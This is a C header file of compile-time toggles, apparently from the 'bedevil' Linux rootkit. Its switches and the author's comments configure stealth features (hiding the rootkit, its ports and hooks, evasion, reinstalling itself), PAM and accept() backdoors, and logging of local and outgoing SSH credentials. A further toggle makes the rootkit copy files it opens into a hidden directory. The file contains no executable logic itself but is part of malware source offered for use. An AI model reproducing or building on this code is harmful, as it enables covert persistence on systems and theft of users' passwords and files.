#ifndef TOGGLES_H
#define TOGGLES_H

/*
 * you can manually define or undefine these following toggles, or allow
 * bedevil.sh to make the changes for you.
 * `./bedevil.sh -t` will allow you to switch these toggles without editing
 * the file manually.

 * if you want a toggle to be ignored by toggles.sh, just put '//ignore'
 * at the end of the line.
 *     i.e.: '#define RANDOM_TOGGLE //ignore'
 */

/* i've got two features disabled and ignored by default,
 * simply because there are things to repair before having
 * our other features play their parts.
 * atm, i've got LOG_SSH and FILE_STEAL disabled & ignored.
 * this isn't that big of a deal, really... */

/* requires PAM */
#undef USE_PAM_BD

/* no mandatory dependencies unless you choose to use SSL.
 * (see ACCEPT_USE_SSL below) */
#undef USE_ACCEPT_BD

/* all of the essential presence hiding toggles are ignored... */
#define HIDE_SELF //ignore
#define HIDE_HOOKS //ignore
#define FORGE_MAPS //ignore
#define HIDE_PORTS //ignore
#define DO_REINSTALL //ignore
#define DO_EVASIONS //ignore
#define BLOCK_STRINGS //ignore

/* requires PAM. logs successful user authentications by hooking
 * the pam_prompt functions and writing respective user credentials
 * to the determined log file. */
#undef LOG_LOCAL_AUTH

/* when this is defined, outgoing ssh connections are logged.
 * the respective host, username and password used are written to
 * the log. you can read this log file in your installation directory.
 * there is no way of determining initially if the login is correct.
 * it's up to you to verify if the login works. */
/* one of the things i've got disabled right now... also excluded the
 * responsible hooks */
#undef LOG_SSH //ignore

/* when this is defined, files opened by open and fopen
 * are copied to INTEREST_DIR. this is defined in
 * hooks/open/consts. (etc/defaults.sh defines the path itself)
 * the files that are of interest to us are defined in
 * hooks/open/char_arrays. */
/* also got this disabled... */
#undef FILE_STEAL //ignore
/* when this is defined w/ FILE_STEAL, when an attempt to
 * steal a file by copying it to its new path fails,
 * attempt to make a new link in the interesting dir for
 * it instead. i would personally discourage using this
 * but it's here anyway... */
#undef LINK_IF_ERR //ignore

#define USE_CRYPT //ignore
/* requires SSL. SSL backdoor source port is $((( ACCEPT_PORT + 1 ))) */
#undef ACCEPT_USE_SSL
#define EXEC_PRE_SHELL //ignore

#endif